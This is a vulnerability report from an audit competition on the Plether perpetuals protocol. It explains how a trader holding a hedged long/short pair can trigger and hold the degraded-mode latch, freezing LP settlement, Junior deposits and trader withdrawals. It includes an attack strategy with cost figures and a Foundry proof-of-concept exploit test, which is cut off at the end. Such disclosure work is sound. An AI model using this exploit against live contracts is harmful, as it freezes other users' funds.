# \#98842 [SC-High] A trader can latch degraded mode with a hedged pair and hold it, halting LP epoch settlement and freezing matured Junior deposit escrow until the owner recapitalizes

**Submitted on Nov 10th 2026 at 14:19:34 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98842
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Open admission bounds only the larger side's maximum-profit envelope: `E >= L + B`, with `B = ceil(L * 25 bps)` at release. A long/short pair held in two accounts grows both envelopes while adding almost no net risk, so one unprivileged actor can push `L` to about 99.7% of pool effective assets. After an ordinary basket move of at least ~0.8%, closing the winning leg pays its profit out of pool cash. [`CfdEngine::_enterDegradedModeIfInsolvent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369) then finds `E < L` and latches `degradedMode`.

The attacker keeps the losing leg open and margined, so `E < L` persists:
- the latch has no automatic or permissionless clear;
- the defended leg cannot be liquidated while its equity stays above maintenance (0.1% of notional, or 3% during the weekly FAD window);
- [`CfdEngine::clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L655-L667) reverts `CfdEngine__StillInsolvent` until the owner donates new capital.

While the latch holds:
- every LP epoch settlement reverts `HousePool__DegradedMode`, so no deposit activates and no redemption is funded;
- a matured Junior deposit cannot be cancelled. That is USDG held in `TrancheVault` escrow which never entered the pool;
- a matured redemption cannot be cancelled;
- a trader with an open position cannot withdraw any clearinghouse settlement without first closing the position.

The proof holds this for three days, Monday to Thursday, outside the FAD window, at release risk parameters. It freezes a 50,000 USDG pending Junior deposit, leaves a queued redemption unsettleable and uncancellable, and blocks a bystander trader's 49,998 USDG settlement while its position stays open. The release requires an owner donation of 19 bps of the pool.

## Note on known-issue status

We know the organic form of this behaviour is documented, and that the team may already consider it addressed outside the competition materials. In that form, a profitable close leaves `E < L` while the opposite side sets `L`. Where it is documented:
- the whitepaper notes that `L` is not a pathwise reserve and that a long/short sequence "may enter degraded mode after a terminal action" ([`WHITEPAPER.md#L268-L291`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L268-L291), [`#L1763-L1768`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1763-L1768));
- upstream plether-core PR #74 introduced the settlement buffer for it. Its merge commit `417435ca` is part of this repository's history.

The behaviour is not in the program's known-issue list or in the listed SECURITY.md sections, so we are submitting it in good faith and accept closure as a known issue if the team considers it covered. What we are raising is the undocumented presumption behind the design. That text describes organic settlement ordering, which an owner recapitalizes after the fact. It does not consider that a single actor can manufacture the state on demand at release parameters and keep the clear condition under its own control. Meanwhile Junior deposit escrow, which never entered the pool, has no exit.

## Vulnerability Details

### Intended behaviour

Degraded mode is the protocol's containment state when pool effective assets fall below the payout envelope. SECURITY.md states the invariant: "If a close or liquidation leaves raw post-op `E < L`, `degradedMode` latches and blocks further risk expansion while still permitting protective transitions" ([`SECURITY.md#L335-L347`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L335-L347)). The settlement-liability buffer `B` gives headroom so that ordinary settlement ordering rarely reaches that state: "Open and increase admission requires post-op `E >= L + B`" ([`SECURITY.md#L922-L943`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L922-L943)). Release values are in [`DEPLOYMENT.md`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md): buffer 25 bps, IM 0.2%, MM 0.1%, FAD margin 3%, VPI 1%, max skew 40%.

### Root cause

1. **Admission sees only the envelope maximum.** [`CfdEnginePlanLib`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L762-L779) admits an open while `hasRequiredSettlementBuffer(E_after, L_after, 25 bps)` holds. Here `L` is the larger of the two side envelopes ([`CfdEngine::_maxLiability`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1044-L1050)):

```solidity
    function _maxLiability() internal view returns (uint256) {
        (SideState storage longState, SideState storage shortState) = _longAndShortStates();
        return
            longState.maxProfitAssets > shortState.maxProfitAssets
                ? longState.maxProfitAssets
                : shortState.maxProfitAssets;
    }
```

   A long and a short of equal envelope leave `L` equal to one leg's envelope. Interleaving the opens keeps skew below `maxSkewRatio`, so one actor can fill `L` up to `E / 1.0025`. Position margin sits in the `MarginClearinghouse`, outside `E`. The protocol floor is initial margin (0.2% of notional). The proof posts about 1.1% per leg (24,331 USDG in all), and a real attacker keeps each leg margined for the move it may lose.

2. **A winning close latches before anything else can respond.** The close path pays the winner's profit from pool cash and then evaluates the latch ([`CfdEngine.sol#L1312-L1321`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1312-L1321)). The check in `_enterDegradedModeIfInsolvent` ([`CfdEngine.sol#L1364-L1368`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1364-L1368)) compares against `L`, which the surviving leg keeps unchanged. Any payout larger than the remaining `E - L` headroom (3,000 USDG here, just above `B`) therefore gives `E < L`:

```solidity
        uint256 maxLiabilityAssets = _maxLiability();
        if (effectiveAssetsAfter < maxLiabilityAssets) {
            degradedMode = true;
            emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
        }
```

3. **Only the owner can clear, and only after `E >= L`.**

```solidity
    function clearDegradedMode() external onlyOwner {
        if (!degradedMode) {
            revert CfdEngine__NotDegraded();
        }
        if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
            revert CfdEngine__StillInsolvent();
        }
```

   **Holding the leg.** The attacker keeps `L` high by holding the losing leg. It tops up margin with [`CfdEngine::addMargin`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L530), which has no degraded-mode gate. A position above maintenance cannot be liquidated (`CfdEngine__PositionIsSolvent`).

   **Weekends.** During the FAD window (Friday 16:30 to Sunday 17:15 New York) liquidation uses the 3% `fadMarginBps` ([`CfdEnginePlanLib.sol#L1450`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450)). A hold across a weekend therefore needs equity above 3% of notional: about 32,640 USDG here, against the proof's 23,869 USDG. The attacker posts about 9,000-10,000 USDG more margin before Friday. That is capital, not cost.

   **No drift.** Unrealized carry does not enter `E`, so the state does not drift back by itself; the proof measures identical `E` and `L` after three days. The attacker pre-funds the leg rather than topping it up, because a top-up realizes the accrued carry into `E`.

   **No other exit.** No permissionless action reduces `L` or raises `E` on the attacker's behalf. Carry realization on another account cannot be triggered by a third party, and there is no force-reduce path for an envelope-holding position.

4. **What the latch blocks:**
   - **LP epoch settlement.** [`HousePool::settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L828-L834) reaches [`_requireWithdrawalsLive`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1870), which reverts `HousePool__DegradedMode`. The public `OrderRouter.settleLpEpoch` forwards that revert unchanged.
   - **Matured Junior deposits.** [`TrancheVault::cancelPendingDeposit`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860) refuses a matured deposit unless the epoch was rejected, a terminal wipe is projected, or Senior is impaired. Only settlement can reject an epoch, and settlement reverts. The deposit's USDG never reached the pool. Senior pending deposits have an extra exit through the guardian's LP-settlement hold; Junior deposits do not.
   - **Matured redemptions.** [`TrancheVault::cancelRedeemRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L894-L897) refuses once the epoch is current.
   - **Live traders' settlement.** [`MarginClearinghouse::withdraw`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L464) calls the engine guard. [`CfdEngineSettlementSidecar::validateWithdraw`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L276) reverts `CfdEngine__DegradedMode` for any account with an open position. Flat accounts can withdraw.

The pool is not insolvent in this state. It is short only of a worst-case payout envelope that the attacker built, and keeps alive, with two positions whose combined exposure is close to zero. The 25 bps buffer does not prevent this. The attacker chooses the payout size (the captured move times notional, net of VPI and fee), and admission cannot tell a pair split across two accounts (each account holds one directional position) from two independent traders.

## Impact Details

Selected impact: **Temporary freezing of funds for at least 24 hours (High)**. The primary frozen funds are matured Junior deposit escrow: USDG outside the pool, with no unprivileged exit, held for as long as the attacker keeps `E < L`. The fallback is "Temporary freezing of funds for at least 1 hour" or Griefing (Medium), if the owner's response time is taken to bound the duration.

Measured in the proof at release risk parameters, pool effective assets 1,102,000 USDG:

| Quantity | Value |
| :-- | :-- |
| Side envelopes after saturation (both) | 1,099,000 USDG (E - L gap 3,000 USDG vs buffer target 2,747.5 USDG) |
| Attacker margin, both legs | 24,331 USDG (2.2% of the pool) |
| Extra margin on the losing leg so it survives the move | 21,980 USDG outside FAD; about 31,000 USDG to also clear the 3% FAD maintenance over a weekend |
| Basket move | 1%. The minimum is ≈0.8% at release parameters: the payout must exceed the E - L headroom after the close's VPI (5,322 USDG, ≈0.48% of notional) and the 0.04% execution fee |
| Winning-close payout to the attacker | 5,185 USDG (offset by the held leg's unrealized loss) |
| E / L after the close and three days later | 1,096,816 / 1,099,000 USDG, unchanged |
| Victim Junior deposit frozen in vault escrow at +3 days | 50,000 USDG (cannot settle or cancel) |
| Victim LP redemption at +3 days | half of a 100,000 USDG position (cannot settle or cancel) |
| Bystander trader settlement blocked at +3 days | 49,998 USDG (withdrawable only after closing the position) |
| Owner donation required to release | 2,184 USDG (19 bps of the pool) |

Redemptions are a secondary effect. At saturation, the LP cash firewall (`C + L + B`) already leaves only about 253 USDG free, so redemption funding is limited by liquidity with or without the latch. What the latch adds is that queued shares can be neither settled nor cancelled.

- **Scope of the freeze.** The table shows one victim of each kind. While degraded, new deposit requests are rejected ([`HousePool.sol#L1139-L1145`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1145)), and a deposit can still be cancelled until its hourly epoch starts. The frozen deposits are therefore requests queued before the latch whose epoch starts before they are settled, in both tranches' queues. For the Junior tranche they have no exit at all. LP settlement halts for both tranches.
- **Duration and release.** No unprivileged action ends the latch: `clearDegradedMode` is owner-only and needs `E >= L`. While the held leg stays margined, `E` rises only through other accounts' realized losses and carry, or through the holder's own checkpoints. Accrued carry is about 141 USDG per day, so a long hold is pre-funded rather than topped up. The direct release is an owner donation of `L - E`: 19 bps here, scaling with the captured move. Fully restoring opens and redemption funding needs `L - E + B`. The program assumes no detection or response deadline ([work-logistics: Operating Assumptions](https://immunefi.com/audit-competition/plether/scope/)).
- **Attacker cost.** Per cycle at the proof's scale:
  - VPI on the winning close: 5,322 USDG.
  - Execution fees: about 1,750 USDG.
  - Net VPI on the opens: 87 USDG.
  - Total: about 7,150 USDG (0.65% of the pool).

  On top of that, carry on the held leg is about 141 USDG per day, and about 290 USDG per day on both legs while waiting for the move. Margin is recoverable. The winning payout and the held leg's unrealized loss offset each other.
- **Not a lack-of-liquidity effect.** The frozen Junior deposit escrow is USDG that never entered the pool. It is frozen by a state latch that a single actor can set and hold, not by a shortage of pool cash. The pool holds more than 99.8% of `L` throughout.

## Mitigation

- Evaluate the latch against `L` net of the closing account's linked exposure, or require the payout to exceed `B` plus a margin-backed bound before latching. Alternatively, size `B` against the largest payout a single close can extract rather than as a fixed fraction of `L`.
- Give LP escrow an exit while settlement is blocked by degraded mode: allow cancelling matured unsettled deposits (both tranches) and redemptions.
- Add a permissionless `clearDegradedMode` once `E >= L`, and let keepers force-reduce envelope-holding positions while degraded.

## References

- [`CfdEngine::_enterDegradedModeIfInsolvent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369): the latch, evaluated after the close payout.
- [`CfdEngine.sol#L1312-L1321`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1312-L1321): the close path ordering; [`CfdEnginePlanLib.sol#L1450`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450): FAD maintenance; [`HousePool.sol#L1139-L1145`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1145): entry blocked while degraded.
- [`CfdEngine::clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L655-L667): owner-only clear once `E >= L`.
- [`CfdEngine::_maxLiability`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1044-L1050): `L` is the larger side envelope.
- [`CfdEnginePlanLib.sol#L762-L779`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L762-L779): buffer admission.
- [`HousePool.sol#L828-L834`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L828-L834) and [`HousePool.sol#L1864-L1870`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1870): settlement blocked while degraded.
- [`TrancheVault.sol#L851-L860`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860) and [`TrancheVault.sol#L894-L897`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L894-L897): no cancel for matured deposits and redemptions.
- [`CfdEngineSettlementSidecar.sol#L255-L276`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L276): live-position withdrawals blocked while degraded.
- [`WHITEPAPER.md#L268-L291`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L268-L291) and [`#L1763-L1768`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1763-L1768): the organic long/short latch case and the non-pathwise buffer (see the note above).
- [`SECURITY.md#L335-L347`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L335-L347) and [`SECURITY.md#L922-L943`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L922-L943): the latch and buffer design. Neither is a listed known issue.
- Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).


## Proof of Concept

## Proof of Concept

Setup. The proof is a Foundry test in the repository's own perps test suite at the pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).
- It extends the suite's `HousePoolAsyncTestBase` / `BasePerpTest` and sets the risk parameters to the release values.
- Every trader order goes through `OrderRouter.commitOrder` from the trader and `OrderRouter.executeOrder` from an unrelated keeper with a Pyth update.
- LP settlement and the liquidation attempt use the public `OrderRouter.settleLpEpoch` and `OrderRouter.executeLiquidation`.
- `vm.prank` only selects the sender. The only suite shortcut is onboarding the victim LP before the attack.
- Only out-of-scope components are mocked: the suite's `MockSettlementToken` (USDG) and `MockPyth`. No in-scope contract is modified.
- The owner acts only in the last step, as the remedy.

Place the file at `packages/perps/test/poc/degraded-latch-hold/ProofAttackerHeldDegradedLatch.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/poc/degraded-latch-hold forge test --match-path 'test/poc/degraded-latch-hold/*.t.sol' -vv
```

`FOUNDRY_TEST` limits the via-IR compile to the sources plus the proof directory. On a machine that can compile the whole test tree, the plain `forge test --match-path ...` works too.

The single test does the following:
1. A victim LP joins with 100,000 USDG, and a bystander trader opens a small long through the Router.
2. The attacker's two accounts interleave Router long and short opens until admission rejects both sides.
3. The attacker adds margin to the losing leg.
4. The victim LP queues a redemption of half its shares, and a second victim queues a 50,000 USDG Junior deposit.
5. After a 1% move the attacker's Router close of the winning leg executes, and `degradedMode` latches.
6. Three days later the test asserts that `E < L` still holds and that `clearDegradedMode` reverts `StillInsolvent`.
   - `OrderRouter.settleLpEpoch` with a fresh Pyth update reverts `HousePool__DegradedMode`.
   - The matured deposit cancel reverts `DepositEpochAlreadyActive`, and the matured redemption cancel reverts `RedeemCancellationUnavailable`.
   - The bystander's withdrawal reverts `CfdEngine__DegradedMode`.
   - `OrderRouter.executeLiquidation` on the defended leg reverts `CfdEngine__PositionIsSolvent` (selector `0x451cebb2`).
7. The owner donates the gap and clears.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Proof: an unprivileged trader manufactures the degraded-mode latch with a hedged pair, holds it by defending
// the losing leg, and thereby freezes LP epoch settlement, matured Junior deposits and redemptions, and every
// live-position trader's settlement withdrawal until the owner recapitalizes the gap.
// Fixture: the repository's own HousePoolAsyncTestBase / BasePerpTest, unmodified; risk parameters set to the
// release values in packages/perps/DEPLOYMENT.md. Only out-of-scope components are mocked (USDG, Pyth).
// Every trader order goes through OrderRouter.commitOrder + a third-party keeper's OrderRouter.executeOrder with
// Pyth data; LP settlement and liquidation go through the public Router entrypoints. vm.prank only selects the
// sender. The only suite shortcut is the pre-attack onboarding of the victim LP (_depositAsync).

import {HousePoolAsyncTestBase} from "../../perps/shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

contract ProofAttackerHeldDegradedLatchTest is HousePoolAsyncTestBase {
    address attackerLong = address(0xa11ce00000000000000000000000000000000001);
    address attackerShort = address(0x5b0f700000000000000000000000000000000002);
    address victimTrader = address(0x717c700000000000000000000000000000000003);
    address lpRedeemer = address(0x1900000000000000000000000000000000000004);
    address lpDepositor = address(0x1900000000000000000000000000000000000005);
    address keeper = address(0x6eE9000000000000000000000000000000000006);

    uint256 constant PRICE = 1e8; // basket mark 1.00, CAP_PRICE = 2e8
    uint256 constant MOVE_DOWN_PRICE = 0.99e8; // 1% move in favour of the LONG leg

    // Release risk parameters (DEPLOYMENT.md "Initial release parameters"; v2.0.0 manifest economics).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ---------------------------------------------------------------------------------------------
    // Views
    // ---------------------------------------------------------------------------------------------

    function _effectiveAssets() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _sideEnv(CfdTypes.Side side) internal view returns (uint256) {
        (uint256 maxProfitAssets,,,) = engine.sides(uint256(side));
        return maxProfitAssets;
    }

    function _maxL() internal view returns (uint256) {
        uint256 l = _sideEnv(CfdTypes.Side.LONG);
        uint256 s = _sideEnv(CfdTypes.Side.SHORT);
        return l > s ? l : s;
    }

    // ---------------------------------------------------------------------------------------------
    // Public-entrypoint helpers
    // ---------------------------------------------------------------------------------------------

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 now_ = vm.getBlockTimestamp();
        // Market orders: accept any execution price (OrderValidationLib.checkSlippage).
        uint256 target;
        if (isClose) target = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        else target = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, now_, vm.getBlockNumber())),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(now_) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// Trader commits through the Router; an unrelated keeper executes with a Pyth update at `price`.
    function _commitAndExecute(
        address account,
        OrderV3Types.OrderRequest memory request,
        uint256 price
    ) internal returns (OrderV3Types.LifecycleStatus) {
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythData = _mockPythUpdateData(price);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, pythData);
        return result.status;
    }

    // External wrapper so try/catch bounds a commit that the Router rejects up front.
    function routerOpen(address account, CfdTypes.Side side, uint256 size, uint256 margin) external returns (bool) {
        require(msg.sender == address(this), "self only");
        return _commitAndExecute(account, _request(side, size, margin, false), PRICE)
            == OrderV3Types.LifecycleStatus.Executed;
    }

    function _tryOpen(address account, CfdTypes.Side side, uint256 size, uint256 margin) internal returns (bool ok) {
        try this.routerOpen(account, side, size, margin) returns (bool executed) {
            ok = executed;
        } catch {
            ok = false;
        }
    }

    // ---------------------------------------------------------------------------------------------
    // Proof
    // ---------------------------------------------------------------------------------------------

    function test_attackerHeldDegradedLatchFreezesLpAndTraderFunds() public {
        vm.deal(keeper, 100 ether);

        // 0. Baseline pool, plus an ordinary Junior LP (victim) onboarded before the attack.
        emit log_named_uint("baseline effective assets E", _effectiveAssets());
        (, uint256 lpShares) = _depositAsync(juniorVault, lpRedeemer, 100_000e6);
        _finishAsyncCooldown(juniorVault, lpRedeemer);
        emit log_named_uint("effective assets E with victim LP", _effectiveAssets());
        assertFalse(engine.degradedMode(), "baseline must not be degraded");

        // 1. A bystander trader opens a small LONG; its settlement will be frozen by the latch.
        _fundTrader(victimTrader, 50_000e6);
        assertEq(
            uint8(_commitAndExecute(victimTrader, _request(CfdTypes.Side.LONG, 5_000e18, 2_000e6, false), PRICE)),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "bystander open executes"
        );

        // 2. Attacker: two accounts, paired LONG/SHORT opens through the Router, interleaved and refined until the
        //    settlement-buffer admission rejects every further increment on both sides.
        _fundTrader(attackerLong, 400_000e6);
        _fundTrader(attackerShort, 400_000e6);
        uint256[6] memory steps = [uint256(100_000e18), 50_000e18, 10_000e18, 5_000e18, 2_000e18, 1_000e18];
        for (uint256 i; i < steps.length; i++) {
            while (true) {
                uint256 margin = steps[i] / 100_000e18 * 500e6 + 500e6;
                bool okL = _tryOpen(attackerLong, CfdTypes.Side.LONG, steps[i], margin);
                bool okS = _tryOpen(attackerShort, CfdTypes.Side.SHORT, steps[i], margin);
                if (!okL && !okS) break;
            }
        }
        uint256 l0 = _maxL();
        uint256 e1 = _effectiveAssets();
        emit log_named_uint("long side envelope", _sideEnv(CfdTypes.Side.LONG));
        emit log_named_uint("short side envelope", _sideEnv(CfdTypes.Side.SHORT));
        emit log_named_uint("effective assets E after saturation", e1);
        emit log_named_uint("E - L gap", e1 - l0);
        emit log_named_uint("buffer target ceil(L*25bps)", (l0 * 25 + 9_999) / 10_000);
        assertTrue(e1 >= l0, "admission keeps E >= L");
        assertFalse(engine.degradedMode(), "saturation alone does not latch");
        uint256 marginLocked = clearinghouse.pnlPledgeAssets(attackerLong) + clearinghouse.pnlPledgeAssets(attackerShort);
        emit log_named_uint("attacker margin locked (both legs)", marginLocked);
        emit log_named_uint("attacker margin as bps of pool", marginLocked * 10_000 / e1);

        // 3. Pre-fund the losing SHORT leg so it stays above maintenance after the move (no keeper can liquidate it).
        uint256 before = clearinghouse.pnlPledgeAssets(attackerShort);
        uint256 topUp = _sideEnv(CfdTypes.Side.SHORT) / 100 * 2;
        vm.prank(attackerShort);
        engine.addMargin(attackerShort, topUp);
        emit log_named_uint("margin added to the held SHORT leg", clearinghouse.pnlPledgeAssets(attackerShort) - before);

        // 4. Ordinary LP activity queued before the trigger: a redemption and a new Junior deposit.
        vm.prank(lpRedeemer);
        uint256 redeemId = juniorVault.requestRedeem(lpShares / 2, lpRedeemer, lpRedeemer);
        uint256 depositId = _requestAsyncDeposit(juniorVault, lpDepositor, 50_000e6);
        emit log_named_uint("victim LP redemption shares queued", lpShares / 2);
        emit log_named_uint("victim depositor USDG in vault escrow", 50_000e6);

        // 5. Ordinary 1% move; the attacker closes the winning LONG through the Router.
        (uint256 sizeA,,,,,,) = engine.positions(attackerLong);
        uint256 balanceBefore = clearinghouse.balanceAssets(attackerLong) + engine.traderClaimBalanceAssets(attackerLong);
        assertEq(
            uint8(_commitAndExecute(attackerLong, _request(CfdTypes.Side.LONG, sizeA, 0, true), MOVE_DOWN_PRICE)),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "winning close executes"
        );
        uint256 balanceAfter = clearinghouse.balanceAssets(attackerLong) + engine.traderClaimBalanceAssets(attackerLong);
        emit log_named_uint("winning-close payout to attacker", balanceAfter - balanceBefore);
        emit log_named_uint("effective assets E after close", _effectiveAssets());
        emit log_named_uint("max liability L after close (held SHORT leg)", _maxL());
        assertTrue(engine.degradedMode(), "hedged winner close latches degraded mode");

        // The attacker's flat account withdraws freely; a live-position bystander cannot withdraw anything.
        uint256 attackerFree = clearinghouse.balanceAssets(attackerLong) / 2;
        vm.prank(attackerLong);
        clearinghouse.withdraw(attackerLong, attackerFree);
        vm.prank(victimTrader);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victimTrader, 1_000e6);

        // 6. Hold for three days. No automatic or permissionless clear exists.
        vm.warp(vm.getBlockTimestamp() + 3 days);
        assertTrue(engine.degradedMode(), "latch persists at +3d");
        uint256 e2 = _effectiveAssets();
        uint256 l2 = _maxL();
        emit log_named_uint("E at +3d", e2);
        emit log_named_uint("L at +3d", l2);
        assertTrue(e2 < l2, "held leg keeps E < L");
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // LP victims at +3d: both requests matured; settlement through the public Router path reverts on the latch,
        // and neither request can be cancelled.
        assertLe(pool.lpEpochStart(depositId), vm.getBlockTimestamp(), "deposit matured");
        assertLe(pool.lpEpochStart(redeemId), vm.getBlockTimestamp(), "redemption matured");
        bytes[] memory settleData = _mockPythUpdateData(MOVE_DOWN_PRICE);
        uint256 settleFee = router.pletherOracle().getUpdateFee(settleData);
        vm.prank(keeper);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch{value: settleFee}(settleData);
        emit log("Router settleLpEpoch at +3d with a fresh Pyth update: reverts HousePool__DegradedMode");
        vm.prank(lpDepositor);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(depositId, lpDepositor, lpDepositor);
